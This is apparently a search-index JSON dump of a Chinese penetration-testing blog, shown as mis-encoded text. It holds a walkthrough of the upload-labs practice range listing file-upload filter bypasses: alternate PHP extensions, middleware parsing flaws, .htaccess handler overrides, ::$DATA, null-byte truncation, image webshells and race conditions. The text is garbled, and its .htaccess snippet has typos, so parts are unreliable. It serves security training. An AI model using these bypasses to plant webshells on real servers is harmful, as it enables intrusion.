æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"1 å‰è¨€ é¶åœºç¯å¢ƒï¼šhttps://github.com/c0ny1/upload-labs ç¯å¢ƒæ­å»ºï¼š docker pull c0ny1/upload-labs docker run -d -p 80:80 upload-labs åˆ¤æ–­ä¸Šä¼ æ¼æ´çš„ç±»å‹ï¼š æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸»è¦å­˜åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š å¯è§£æçš„åç¼€ï¼Œä¹Ÿå°±æ˜¯è¯¥è¯­è¨€æœ‰å¤šä¸ªå¯è§£æçš„åç¼€ï¼Œæ¯”å¦‚ php è¯­è¨€å¯è§£æçš„åç¼€ä¸ºphpï¼Œphp2ï¼Œphp3 ç­‰ç­‰ å¤§å°å†™æ··åˆï¼Œå¦‚æœç³»ç»Ÿè¿‡æ»¤ä¸ä¸¥ï¼Œå¯èƒ½å¤§å°å†™å¯ä»¥ç»•è¿‡ã€‚ ä¸­é—´ä»¶ï¼Œæ¯æ¬¾ä¸­é—´ä»¶åŸºæœ¬éƒ½è§£ææ¼æ´ï¼Œæ¯”å¦‚ iis å°±å¯ä»¥æŠŠ xxx.asp;.jpg å½“ asp æ¥æ‰§è¡Œã€‚ ç³»ç»Ÿç‰¹æ€§ï¼Œç‰¹åˆ«æ˜¯ Windows çš„åç¼€åŠ ç‚¹ï¼ŒåŠ ç©ºæ ¼ï¼ŒåŠ  ::$DATA å¯ä»¥ç»•è¿‡ç›®æ ‡ç³»ç»Ÿã€‚ è¯­è¨€æ¼æ´ï¼Œæµè¡Œçš„ä¸‰ç§è„šæœ¬è¯­è¨€åŸºæœ¬éƒ½å­˜åœ¨ 00 æˆªæ–­æ¼æ´ã€‚ åŒåç¼€ï¼Œè¿™ä¸ªä¸ç³»ç»Ÿå’Œä¸­é—´ä»¶æ— å…³ï¼Œå¶å°”ä¼šå­˜åœ¨äºä»£ç é€»è¾‘ä¹‹ä¸­ã€‚ ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"1.1 å¯è§£æçš„åç¼€ å¾ˆå¤šè¯­è¨€éƒ½æœ‰å¤šä¸ªå¯ä»¥è§£æåç¼€ã€‚å½“ç›®æ ‡ç«™ç‚¹é‡‡ç”¨é»‘åå•æ—¶ï¼Œå¾€å¾€åŒ…å«ä¸å…¨ã€‚ è¯­è¨€ å¯è§£æåç¼€ asp/aspx aspã€aspxã€asaã€asaxã€ascxã€ashxã€asmxã€cer php phpã€php5ã€php4ã€php3ã€php2ã€phtmlã€pht jsp jspã€jspaã€jspxã€jswã€jsvã€jspfã€jhtml ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"1.2 ä¸­é—´ä»¶æ¼æ´ 1.2.1 IIS IIS ä¸€å…±æœ‰ä¸‰ä¸ªè§£ææ¼æ´ï¼š IIS 6.0 æ–‡ä»¶è§£æ xx.asp;.jpg IIS 6.0 ç›®å½•è§£æ xx.asp/1.jpg IIS 7.5 ç•¸å½¢è§£æ xxx.jpg/x.php 1.2.2 Apahce apache ç›¸å…³çš„è§£ææ¼æ´æœ‰ä¸¤ä¸ªï¼š %0a (CVE-2017-15715) æœªçŸ¥åç¼€ test.php.xxx 1.2.3 nginx nginx è§£ææ¼æ´æœ‰ä¸‰ä¸ªï¼š è®¿é—®é“¾æ¥åŠ  /xxx.phpï¼Œå³ test.jpg/xxx.php ç•¸å½¢è§£ææ¼æ´ test.jpg%00xxx.php CVE-2013-4547 test.jpg(éç¼–ç ç©ºæ ¼)\\0x.php 1.2.4 tomcat tomcat ç”¨äºä¸Šä¼ ç»•è¿‡çš„æœ‰ä¸‰ç§ï¼Œéƒ¨åˆ†é™åˆ¶åœ¨ windows æ“ä½œç³»ç»Ÿä¸‹ã€‚ xxx.jsp/ xxx.jsp%20 xxx.jsp::$DATA ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"1.3 ç³»ç»Ÿç‰¹æ€§ ç»è¿‡æŸ¥èµ„æ–™ï¼Œç›®å‰å‘ç°åœ¨ç³»ç»Ÿå±‚é¢ï¼Œæœ‰ä»¥ä¸‹ç‰¹æ€§å¯ä»¥è¢«ä¸Šä¼ æ¼æ´æ‰€åˆ©ç”¨ã€‚ Windows ä¸‹æ–‡ä»¶åä¸åŒºåˆ†å¤§å°å†™ï¼ŒLinuxä¸‹æ–‡ä»¶ååŒºåˆ†å¤§å†™ Windows ä¸‹ ADS æµç‰¹æ€§ï¼Œå¯¼è‡´ä¸Šä¼ æ–‡ä»¶ xxx.php::$DATA = xxx.php Windows ä¸‹æ–‡ä»¶åç»“å°¾åŠ å…¥.ã€ç©ºæ ¼ã€\u003cã€\u003eã€\u003e\u003e\u003eã€0x81-0xffç­‰å­—ç¬¦ï¼Œæœ€ç»ˆç”Ÿæˆçš„æ–‡ä»¶å‡è¢« windows å¿½ç•¥ã€‚ ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:3","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"2 WriteUP ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"2.1 PASS - 01 \u003cscript type=\"text/javascript\"\u003e function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") { alert(\"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!\"); return false; } //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ var allow_ext = \".jpg|.png|.gif\"; //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ var ext_name = file.substring(file.lastIndexOf(\".\")); //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼  if (allow_ext.indexOf(ext_name) == -1) { var errMsg = \"è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ \" + allow_ext + \"ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š\" + ext_name; alert(errMsg); return false; } } \u003c/script\u003e å‰ç«¯ç¦ç”¨JSï¼Œç›´æ¥ä¸Šä¼  Webshell ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"2.2 PASS - 02 ç»•è¿‡ MIME æ£€æµ‹ï¼Œé€šè¿‡ BurpSuite ä¿®æ”¹ Content-Type å³å¯ ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"2.3 PASS - 03 $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º åç«¯è¿‡æ»¤äº† .phpï¼Œé€šè¿‡ä½¿ç”¨ .php3ã€php5ã€php7ã€phtmlã€pht ç­‰åç¼€ç»•è¿‡æ£€æµ‹ ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:3","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"2.4 PASS - 04 é‡å†™æ–‡ä»¶è§£æè§„åˆ™ç»•è¿‡ã€‚ä¸Šä¼ å…ˆä¸Šä¼ ä¸€ä¸ªåä¸º .htaccess æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ \u003cFiileMatch \"04.jpg\"\u003e SetHandler application/x-httpd-php \u003c/FiileMatch\u003e å†ä¸Šä¼ ä¸€ä¸ª 03.jpg ï¼Œè®¿é—® 03.jpgï¼Œå³ä»¥ PHP æ–‡ä»¶è¿›è¡Œè§£æã€‚ ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:4","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"2.5 PASS - 05 è¿˜æ˜¯é»‘åå•ï¼ŒåŠ ä¸Šäº† .htaccessï¼Œä½†æ˜¯æ²¡æœ‰å°†åç¼€è¿›è¡Œå¤§å°å†™ç»Ÿä¸€ï¼Œäºæ˜¯å¯ä»¥é€šè¿‡å¤§å°å†™ç»•è¿‡. ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:5","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"2.6 PASS - 06 åˆ©ç”¨ Windows ç³»ç»Ÿçš„æ–‡ä»¶åç‰¹æ€§ã€‚æ–‡ä»¶åæœ€åå¢åŠ ç‚¹å’Œç©ºæ ¼ï¼Œå†™æˆ06.php[ç©ºæ ¼] ï¼Œ ä¸Šä¼ åä¿å­˜åœ¨ Windows ç³»ç»Ÿä¸Šçš„æ–‡ä»¶åæœ€åçš„ä¸€ä¸ª . ä¼šè¢«å»æ‰ï¼Œå®é™…ä¸Šä¿å­˜çš„æ–‡ä»¶åå°±æ˜¯ 06.php ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:6","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"2.7 PASS - 07 åŸç†åŒ Pass-06ï¼Œæ–‡ä»¶åååŠ ç‚¹ï¼Œæ”¹æˆ 07.php. ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:7","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"2.8 PASS - 08 Windows æ–‡ä»¶æµç‰¹æ€§ç»•è¿‡ï¼Œæ–‡ä»¶åæ”¹æˆ 08.php::$DATAï¼Œä¸Šä¼ æˆåŠŸåä¿å­˜çš„æ–‡ä»¶åå…¶å®æ˜¯ 08.php php åœ¨ window ç¯å¢ƒä¸‹ï¼Œå¦‚æœæ–‡ä»¶å + ::$DATA ä¼šæŠŠ ::$DATA ä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†ï¼Œä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒ ::$DATA ä¹‹å‰çš„æ–‡ä»¶å ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:8","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"2.9 PASS - 09 åŸç†åŒ Pass-06ï¼Œä¸Šä¼ æ–‡ä»¶åååŠ ä¸Šç‚¹ + ç©ºæ ¼+ ç‚¹ï¼Œæ”¹ä¸º 09.php. . ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:9","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"2.10 PASS - 10 åŒå†™æ–‡ä»¶åç»•è¿‡ï¼Œæ–‡ä»¶åæ”¹æˆ 10.pphphp ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:10","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"2.11 PASS - 11 ä¸Šä¼ è·¯å¾„å %00 æˆªæ–­ç»•è¿‡ã€‚ä¸Šä¼ çš„æ–‡ä»¶åå†™æˆ 11.jpgï¼Œsave_path æ”¹æˆ ../upload/11.php%00ï¼Œæœ€åä¿å­˜ä¸‹æ¥çš„æ–‡ä»¶å°±æ˜¯ 11.php ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:11","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"2.12 PASS - 12 åŸç†åŒ Pass-11ï¼Œä¸Šä¼ è·¯å¾„ 0x00 ç»•è¿‡ã€‚è¿™æ¬¡çš„ save_path æ˜¯é€šè¿‡ post ä¼ è¿›æ¥çš„ï¼Œè¿˜æ˜¯åˆ©ç”¨ 00 æˆªæ–­ï¼Œä½†è¿™æ¬¡éœ€è¦åœ¨äºŒè¿›åˆ¶ä¸­è¿›è¡Œä¿®æ”¹ï¼Œå› ä¸º post ä¸ä¼šåƒ get å¯¹ %00 è¿›è¡Œè‡ªåŠ¨è§£ç  åˆ©ç”¨ Burpsuite çš„ Hex åŠŸèƒ½å°† save_path æ”¹æˆ ../upload/12.php[äºŒè¿›åˆ¶00]å½¢å¼ ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:12","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"2.13 PASS - 13 ç»•è¿‡æ–‡ä»¶å¤´æ£€æŸ¥ï¼Œæ·»åŠ  GIF å›¾ç‰‡çš„æ–‡ä»¶å¤´ GIF89aï¼Œç»•è¿‡ GIF å›¾ç‰‡æ£€æŸ¥ã€‚ ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:13","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"2.14 PASS - 14 è¿™é‡Œç”¨ getimagesize è·å–æ–‡ä»¶ç±»å‹ï¼Œè¿˜æ˜¯ç›´æ¥å°±å¯ä»¥åˆ©ç”¨å›¾ç‰‡é©¬å°±å¯è¿›è¡Œç»•è¿‡ ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:14","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"2.15 PASS - 15 è¿™é‡Œç”¨åˆ° php_exif æ¨¡å—æ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œè¿˜æ˜¯ç›´æ¥å°±å¯ä»¥åˆ©ç”¨å›¾ç‰‡é©¬å°±å¯è¿›è¡Œç»•è¿‡ ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:15","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"2.16 PASS - 16 åŸç†ï¼šå°†ä¸€ä¸ªæ­£å¸¸æ˜¾ç¤ºçš„å›¾ç‰‡ï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚å¯»æ‰¾å›¾ç‰‡è¢«æ¸²æŸ“åä¸åŸå§‹å›¾ç‰‡éƒ¨åˆ†å¯¹æ¯”ä»ç„¶ç›¸åŒçš„æ•°æ®å—éƒ¨åˆ†ï¼Œ å°† Webshell ä»£ç æ’åœ¨è¯¥éƒ¨åˆ†ï¼Œç„¶åä¸Šä¼ ã€‚å…·ä½“å®ç°éœ€è¦è‡ªå·±ç¼–å†™ Python ç¨‹åºï¼Œäººå·¥å°è¯•åŸºæœ¬æ˜¯ä¸å¯èƒ½æ„é€ å‡ºèƒ½ç»•è¿‡æ¸²æŸ“å‡½æ•°çš„å›¾ç‰‡ webshell çš„ã€‚ å‚è€ƒï¼š https://xz.aliyun.com/t/2657#toc-12 https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:16","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"2.17 PASS - 17 åˆ©ç”¨æ¡ä»¶ç«äº‰åˆ é™¤æ–‡ä»¶æ—¶é—´å·®ç»•è¿‡ã€‚ åœ¨è„šæœ¬è¿è¡Œçš„æ—¶å€™ï¼Œè®¿é—® Webshell ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:17","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"2.18 PASS - 18 åˆ©ç”¨ä¸Šä¼ é‡å‘½åç«äº‰ + Apacheè§£ææ¼æ´ï¼ŒæˆåŠŸç»•è¿‡ã€‚ ä¸Šä¼ åå­—ä¸º 18.php.7Z çš„æ–‡ä»¶ï¼Œå¿«é€Ÿé‡å¤æäº¤è¯¥æ•°æ®åŒ…ï¼Œä¼šæç¤ºæ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰è¢«é‡å‘½åã€‚ ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:18","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"2.19 PASS - 19 æœ¬å…³è€ƒå¯Ÿ CVE-2015-2348 move_uploaded_file() 00 æˆªæ–­ï¼ŒåŸç†åŒ Pass-11ï¼Œä¸Šä¼ çš„æ–‡ä»¶åç”¨ 0x00 ç»•è¿‡ã€‚æ”¹æˆ 19.php[äºŒè¿›åˆ¶00].1.jpg ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:19","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","é¶åœº"],"content":"2.20 PASS - 20 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) { $file = explode('.', strtolower($file)); } $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) { $msg = \"ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!\"; }else{ $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = \"æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼\"; $is_upload = true; } else { $msg = \"æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼\"; } é¦–å…ˆ end å‡½æ•°å–æ‰€ post å‚æ•°æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå€¼ï¼Œ$file_name = reset($file) . '.' . $file[count($file) - 1]ã€‚æˆ‘ä»¬å¯ä»¥ post ä¸€ä¸ªå‚æ•°åä¸ºä¸€ä¸ª [0]ä¸€ä¸ª [2]ï¼Œç„¶å $file[count($file) - 1] å°±ä¸ºç©ºï¼Œ$file_name æœ€ç»ˆå°±ä¸ºreset($file) å³ $file[0]ï¼Œå°±å¯ä»¥ç»•è¿‡åˆ¤æ–­ ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:20","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ç›¸å…³","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"WEB å®¹å™¨å®‰å…¨ç›¸å…³","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"WEB å®¹å™¨å®‰å…¨","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"WEB å®¹å™¨å®‰å…¨ ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:0:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"WEB å®¹å™¨å®‰å…¨","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1 å®šä¹‰åŠåŸç† Web æœåŠ¡å™¨ï¼šæä¾› Web æœåŠ¡å™¨çš„è½¯ä»¶æˆ–ä¸»æœºï¼Œå³ Web æœåŠ¡å™¨è½¯ä»¶æˆ–è€…è£…æœ‰ Web 